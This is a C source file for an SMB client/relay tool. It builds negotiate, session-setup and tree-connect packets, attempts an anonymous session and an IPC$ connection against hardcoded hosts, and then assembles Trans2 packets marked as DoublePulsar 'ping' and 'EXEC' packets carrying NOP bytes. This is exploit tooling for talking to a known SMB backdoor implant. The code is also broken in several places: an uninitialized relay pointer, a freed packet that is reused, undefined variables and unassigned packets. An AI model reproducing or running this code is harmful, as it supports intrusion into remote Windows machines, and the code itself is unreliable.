			memcpy(NewSmbPacket->buffer, (char*)NegotiateProtocolResponseMessage, sizeof(NegotiateProtocolResponse));
			free(NegotiateProtocolResponseMessage);

		}
		else {/* Generates an SMB Negotiate Protocol Response. This packet is needed when acting as an SMB Client.         */
			NegotiateProtocolRequest* NegotiateProtocolRequestMessage;
			NegotiateProtocolRequestMessage = (NegotiateProtocolRequest*)malloc(sizeof(NegotiateProtocolRequest));
			memset((char*)NegotiateProtocolRequestMessage, '\0', sizeof(NegotiateProtocolRequest));
			NewSmbPacket->SmbMessageLength = SREV(35 + DataSize);
			if (DataSize > (sizeof(NewSmbPacket->buffer) - sizeof(NegotiateProtocolRequest) + sizeof(DIALECT*)))
			{
				NewSmbPacket = (smheader*)realloc(NewSmbPacket, sizeof(smheader) - sizeof(NewSmbPacket->buffer) + sizeof(NegotiateProtocolRequest) + DataSize);

			}
			NegotiateProtocolRequestMessage->WordCount = 0;
			NegotiateProtocolRequestMessage->ByteCount = DataSize;
			memcpy(NewSmbPacket->buffer, (char*)NegotiateProtocolRequestMessage, sizeof(NegotiateProtocolRequest) - sizeof(DIALECT*));
			memcpy(NewSmbPacket->buffer + sizeof(NegotiateProtocolRequest) - sizeof(DIALECT*), data, DataSize);
			free(NegotiateProtocolRequestMessage);
		}
		break;






	case SMBCLOSE:
		CloseMessage = (CLOSE*)malloc(sizeof(CLOSE));
		memset((char*)CloseMessage, '\0', sizeof(CLOSE));

		NewSmbPacket->SmbMessageLength = SREV(sizeof(smheader) - sizeof(NewSmbPacket->buffer) + sizeof(CLOSE) - 4);

		CloseMessage->ByteCount = 0;
		CloseMessage->WordCount = 3;
		CloseMessage->LastWrite = 0xFFFFFFFF;
		memcpy((char*)&CloseMessage->FID, (char*)data, 2);
		memcpy(NewSmbPacket->buffer, (char*)CloseMessage, sizeof(CLOSE));
		free(CloseMessage);
		break;


	case SESSIONSETUPANDX:
		if (SubCommand == ERRORRESPONSE) {
			NewSmbPacket->SmbMessageLength = (uint16)SREV(sizeof(smheader) - sizeof(NewSmbPacket->buffer) + 3 - 4);
			NewSmbPacket->NtStatus = 0xc000006d;
			NewSmbPacket->UserID = PreviousSmbMessage->UserID;

		}
		else {
			if (PreviousSmbMessage != NULL) NewSmbPacket->UserID = UserID = PreviousSmbMessage->UserID; //Init UserID parameter

			memset((char*)tail1, '\0', sizeof(tail1));
			memset((char*)tail2, '\0', sizeof(tail2));
			chartoWide((char*)tail1, (char*)"Windows 2000 2195", 17);
			chartoWide((char*)tail2, (char*)"Windows 2000 5.0", 16);

			if (SubCommand == CONTINUERESPONSE) {
				SessionSetupAndXResponseMessage = (SessionSetupAndXResponse*)malloc(sizeof(SessionSetupAndXResponse));
				memset((char*)SessionSetupAndXResponseMessage, '\0', sizeof(SessionSetupAndXResponse));
				//SessionSetupAndXResponse *SessionSetupAndXResponseMessage; 
				//NewSmbPacket->SmbMessageLength=(uint16)SREV (sizeof(smheader)-sizeof(NewSmbPacket->buffer) + sizeof(SessionSetupAndXResponse) + sizeof(tail1) + sizeof(tail2)  -4 );
				NewSmbPacket->SmbMessageLength = SREV(sizeof(smheader) - sizeof(NewSmbPacket->buffer) + sizeof(SessionSetupAndXResponse) + sizeof(tail1) + sizeof(tail2) - 4);
				NewSmbPacket->NtStatus = 0;
				//DumpMem((char*)&PreviousSmbMessage->UserID,0x30);
				//printf("El otro userID es: %i\n",PreviousSmbMessage->UserID);
				//memcpy((char*)&NewSmbPacket->UserID,(char*)&PreviousSmbMessage->UserID,2);
				NewSmbPacket->UserID = PreviousSmbMessage->UserID;
				SessionSetupAndXResponseMessage->WordCount = 4;
				SessionSetupAndXResponseMessage->AndXCommand = 0xff;
				SessionSetupAndXResponseMessage->AndXOffset = SREV(NewSmbPacket->SmbMessageLength);
				SessionSetupAndXResponseMessage->ByteCount = sizeof(tail1) + sizeof(tail2);
				memcpy(NewSmbPacket->buffer, (char*)SessionSetupAndXResponseMessage, sizeof(SessionSetupAndXResponse));
				memcpy(NewSmbPacket->buffer + sizeof(SessionSetupAndXResponse) + 1, (char*)tail1, sizeof(tail1));
				memcpy(NewSmbPacket->buffer + sizeof(SessionSetupAndXResponse) + 1 + sizeof(tail1), (char*)tail2, sizeof(tail2));
				//memcpy(NewSmbPacket->buffer,"\x00\x00\x00",3);	
				free(SessionSetupAndXResponseMessage);
			}
			else {
				SessionSetupAndXMessage = (SessionSetupAndX*)malloc(sizeof(SessionSetupAndX));
				memset((char*)SessionSetupAndXMessage, '\0', sizeof(SessionSetupAndX));
				NewSmbPacket->SmbMessageLength = (uint16)SREV(sizeof(smheader) - sizeof(NewSmbPacket->buffer) + sizeof(SessionSetupAndX) + DataSize + 1 + sizeof(tail1) + sizeof(tail2) + 2 - 4);
				//printf("packet len: %x\n",SREV(NewSmbPacket->SmbMessageLength));
				//printf("LEN: %x\n",NewSmbPacket->SmbMessageLength);
				SessionSetupAndXMessage->WordCount = 12;
				SessionSetupAndXMessage->AndXCommand = 0xff;
				SessionSetupAndXMessage->AndXOffset = SREV(NewSmbPacket->SmbMessageLength);//sizeof(smheader)-1024 +NtlmPacketLen + 1+ sizeof(tail1) + sizeof(tail2) +2 -4;

				SessionSetupAndXMessage->MaxBuffer = 4356;//16644;
				SessionSetupAndXMessage->MaxMpxCount = 10;
				SessionSetupAndXMessage->SecurityBloblength = DataSize; //Longitud del paquete NTLM
				SessionSetupAndXMessage->capabilities = 0x800000d4; //0x200000D4;
				SessionSetupAndXMessage->ByteCount = (uint16)DataSize + 1 + sizeof(tail1) + sizeof(tail2) + 2; //incluimos 2 nulls al final  y un byte antes de los wchars

				memcpy(NewSmbPacket->buffer, (char*)SessionSetupAndXMessage, sizeof(SessionSetupAndX));
				memcpy(NewSmbPacket->buffer + sizeof(SessionSetupAndX), (char*)data, DataSize);
				memcpy(NewSmbPacket->buffer + sizeof(SessionSetupAndX) + DataSize + 1, (char*)tail1, sizeof(tail1));
				memcpy(NewSmbPacket->buffer + sizeof(SessionSetupAndX) + DataSize + 1 + sizeof(tail1), (char*)tail2, sizeof(tail2));
				free(SessionSetupAndXMessage);
			}
			//free(SessionSetupAndXResponseMessage);
		}
		break;


	case TREECONNETANDX:
		if (SubCommand == STATUS_BAD_NETWORK_NAME) {
			NewSmbPacket->SmbMessageLength = (uint16)SREV(sizeof(smheader) - sizeof(NewSmbPacket->buffer) + sizeof(TreeConnectAndXResponse) - 4);
			NewSmbPacket->NtStatus = STATUS_BAD_NETWORK_NAME;
			memset(NewSmbPacket->buffer, '\0', 3);
		}
		else {
			NewSmbPacket->SmbMessageLength = (uint16)SREV(sizeof(smheader) - sizeof(NewSmbPacket->buffer) + DataSize - 4);
			memcpy(NewSmbPacket->buffer, data, DataSize);
		}
		break;


		//    case SMB_COM_CLOSE:

	case SMB_COM_TRANSACTION2_SECONDARY:

	case SMB_COM_TREE_CONNECT:
	case SMB_COM_TREE_DISCONNECT:
		// case SMB_COM_NEGOTIATE:
		// case SMB_COM_SESSION_SETUP_ANDX:
	case SMB_COM_LOGOFF_ANDX:
		//    case SMB_COM_TREE_CONNECT_ANDX:
	
	default:
		//printf("Unsupported SMB message\n");
		free(NewSmbPacket);
		return(NULL);
		break;
	}
	return(NewSmbPacket);
}

int ConnectToRemoteHost(RELAY* relay, char* hostname, int port)
{
#ifdef WIN32
	u_long tmp = 1;
#else
	int tmp = 1;
#endif
	fd_set fds;
	struct timeval tv;
	struct hostent* hostend;
	int i;

	relay->destinationaddr.sin_family = AF_INET;
	relay->destinationaddr.sin_addr.s_addr = inet_addr(hostname);
	if (relay->destinationaddr.sin_addr.s_addr == INADDR_NONE)
	{
		hostend = gethostbyname(hostname);
		if (!hostend)
		{
			return(0);
		}
		memcpy(&relay->destinationaddr.sin_addr.s_addr, hostend->h_addr, 4);
		printf("[+] Remote Server %s  resolved as %s\n", hostname, inet_ntoa(relay->destinationaddr.sin_addr));
	}
	strcpy(relay->hostname, hostname);
	relay->destinationaddr.sin_port = htons(port); //445	  
	relay->destination = socket(AF_INET, SOCK_STREAM, 0);

#ifdef WIN32
	ioctlsocket(relay->destination, FIONBIO, &tmp);
#else
	ioctl(relay->destination, FIONBIO, (char*)&tmp);
#endif
	tv.tv_sec = CONNECT_TIMEOUT;
	tv.tv_usec = 0;
	FD_ZERO(&fds);
	FD_SET(relay->destination, &fds);


	connect(relay->destination, (struct sockaddr*)&relay->destinationaddr, sizeof(relay->destinationaddr));
	i = select((int)relay->destination + 1, 0, &fds, 0, &tv);
	if (i <= 0) {
		printf("[-] Error - Connection against %s:%i Failed\n", hostname, port);
		return(0);
	}
	tmp = 0;
#ifdef WIN32
	ioctlsocket(relay->destination, FIONBIO, &tmp);
#else
	ioctl(relay->destination, FIONBIO, (char*)&tmp);
#endif
	return(1);
}

int main()
{
	unsigned char buf[4096];
	unsigned char buf2[4096];
	smheader* packet;
	smheader* SmbPacket1, * SmbPacket2, * SmbPacket3;
	smheader* errorpacket;
	smheader* NegotiateProtocol;
	smheader* NegotiateProtocolResponse;
	uint16 MultipleID;
	int i;
	RELAY* relay;
	uint16 OriginalUserID;
	int recv_packet_id;
	char clientRequest[4096];

	char* lpUsername[] = "";
	char* lpPassword[] = "";

	char destinationhostname[] = "google.de";
	int destinationport = 445;

	i = ConnectToRemoteHost(relay, destinationhostname, destinationport);
	if (!i) {
		printf("[-] Unable to connect to remote host\r");
	}
	printf("[+] Sending SMB Protocol Handshake against remote SMB Server...\n");
	char* p;
	p = AddDialect(NULL, (char*)"PC NETWORK PROGRAM 1.0", 0x02, &i);
	p = AddDialect(p, (char*)"LANMAN1.0", 0x02, &i);
	p = AddDialect(p, (char*)"Windows for Workgroups 3.1a", 0x02, &i);
	p = AddDialect(p, (char*)"LM1.2X002", 0x02, &i);
	p = AddDialect(p, (char*)"LANMAN2.1", 0x02, &i);
	p = AddDialect(p, (char*)"NT LM 0.12", 0x02, &i);
	NegotiateProtocol = BuildSmbPacket(NULL, NEGOTIATEPROTOCOLREQUEST, 0, p, i);
	free(p);
	i = SendBytesAndWaitForResponse(relay->destination, (char*)NegotiateProtocol, SmbPacketLen(NegotiateProtocol), (char*)buf, sizeof(buf), SMBWAITTIMEOUT);
	free(NegotiateProtocol);
	if (i <= 0) {
		printf("[-] Initial SMBHandShake (LanManager Negotiation) Failed\n");
		return(0);
	}

	recv_packet_id = recv(relay->source, clientRequest, sizeof(clientRequest), 0);
	MultipleID = ((smheader*)clientRequest)->multipleID;

	NegotiateProtocolResponse = BuildSmbPacket(NULL, NEGOTIATEPROTOCOLREQUEST, CONTINUERESPONSE, NULL, 0);
	send(relay->source, (char*)NegotiateProtocolResponse, SmbPacketLen(NegotiateProtocolResponse), 0);

	OriginalUserID = SmbPacket2->UserID;
	MultipleID += 64;
	SmbPacket2->multipleID = MultipleID;

	i = SendBytesAndWaitForResponse(relay->source, (char*)SmbPacket2, SmbPacketLen(SmbPacket2), (char*)clientRequest, sizeof(clientRequest), SMBWAITTIMEOUT);


	/* more functions that can be used */
	//smheader* SmbPacket1, * SmbPacket2, * SmbPacket3;
	//smheader* NegotiateProtocol;

	printf("[+] Sending SMB Authentication Handshake                                    \r");
	p = AddDialect(NULL, (char*)"PC NETWORK PROGRAM 1.0", 0x02, &i);
	p = AddDialect(p, (char*)"LANMAN1.0", 0x02, &i);
	p = AddDialect(p, (char*)"Windows for Workgroups 3.1a", 0x02, &i);
	p = AddDialect(p, (char*)"LM1.2X002", 0x02, &i);
	p = AddDialect(p, (char*)"LANMAN2.1", 0x02, &i);
	p = AddDialect(p, (char*)"NT LM 0.12", 0x02, &i);
	NegotiateProtocol = BuildSmbPacket(NULL, NEGOTIATEPROTOCOLREQUEST, 0, p, i);
	free(p);
	i = SendBytesAndWaitForResponse(relay->destination, (char*)NegotiateProtocol, SmbPacketLen(NegotiateProtocol), (char*)buf, sizeof(buf), SMBWAITTIMEOUT);
	free(NegotiateProtocol);

	//i=InitSmbHandshake(&relay,(char*)buf,sizeof(buf));
	if (i <= 0) {
		printf("[+] Initial SMBHandShake (LanManaz1ger Negotiation) Failed                \n");
		return(0);
	}


	SmbPacket3 = GetSmbPacket3(SmbPacket2, lpUserName, lpPassword, NULL, lpSrcHostname, (tSmbNtlmAuthResponse*)NULL); //<- anonymous connection under windows 2000
	//OR:
	//SmbPacket3=BuildSmbPacket((smheader*)SmbPacket2,SESSIONSETUPANDX,0,buf2,(int)SmbLength((tSmbNtlmAuthResponse *)buf2));

	i = SendBytesAndWaitForResponse(relay->destination, (char*)SmbPacket3, SmbPacketLen(SmbPacket3), (char*)buf, sizeof(buf), SMBWAITTIMEOUT);
	free(SmbPacket3);
	//free(SmbPacket2);
	if (i <= 0) {
		printf("[-] Error reading Server Authentication Response\n");
		return(0);
	}

	if (((smheader*)buf)->NtStatus != 0x00000000) {
		printf("[-] SessionSetupAndX Completed                                            \n");
		printf("[-] Authentication against Remote Host Failed (Error: 0x%8.8X\n", ((smheader*)buf)->NtStatus != 0x00000000);
		return(0);
	}

	if (((SessionSetupAndXResponse*)((smheader*)buf)->buffer)->Action & 0x0001)
	{
		printf("[-] Authentication against Remote Host Failed. (Connected as Guest)\n");

		return(0);
	}

	//SetEnviroment(((smheader*)buf)->UserID,0,0);



  //TreeConnect
	char target[] = "192.168.0.8";
	char path[256];
	sprintf(path, "\\\\%s\\IPC$", target);
	i = BuildTreeConnectAndXStub((char*)buf, (char*)"", path, (char*)"?????");
	packet = BuildSmbPacket((smheader*)NULL, TREECONNETANDX, 0, buf, i);

	i = SendBytesAndWaitForResponse(relay->destination, (char*)packet, SmbPacketLen(packet), (char*)buf, sizeof(buf), SMBWAITTIMEOUT);
	free(packet);
	if ((i <= 0) || (((smheader*)buf)->NtStatus != 0x00000000)) {
		printf("[-] Error. Unable to connect to IPC$\n");
		return(0);
	}

	i = SendBytesAndWaitForResponse(relay->destination, (char*)packet, SmbPacketLen(packet), (char*)buf, sizeof(buf), SMBWAITTIMEOUT);
	free(packet);
	if ((i <= 0) || (((smheader*)buf)->NtStatus != 0x00000000)) {
		printf("[-] Error. Unable to bind to SCM pipe                             \n");
		return(0);
	}


	//change for a trans2 packet
	unsigned char data[] = "\x90\x90";
	int len = 2;
	packet = BuildSmbPacket((smheader*)buf, SMB_COM_TRANS2, SMB_COM_TRANSACTION2_SECONDARY, data, len);
	//((SMB_COM_TRANSACTION_STRUCT*)packet->buffer)->FID=FID;



  //Build Doublepulsar Ping packet here
	((SMB_COM_TRANSACTION_STRUCT*)packet->buffer)->UserID = SmbPacket2->UserID;
	MultipleID = 0x41;
	((SMB_COM_TRANSACTION_STRUCT*)packet->buffer)->multipleID = MultipleID;


	//Build Doublepulsar EXEC packet here
	((SMB_COM_TRANSACTION_STRUCT*)packet->buffer)->UserID = SmbPacket2->UserID;
	MultipleID = 0x42;
	((SMB_COM_TRANSACTION_STRUCT*)packet->buffer)->multipleID = MultipleID;

	return 0;
}


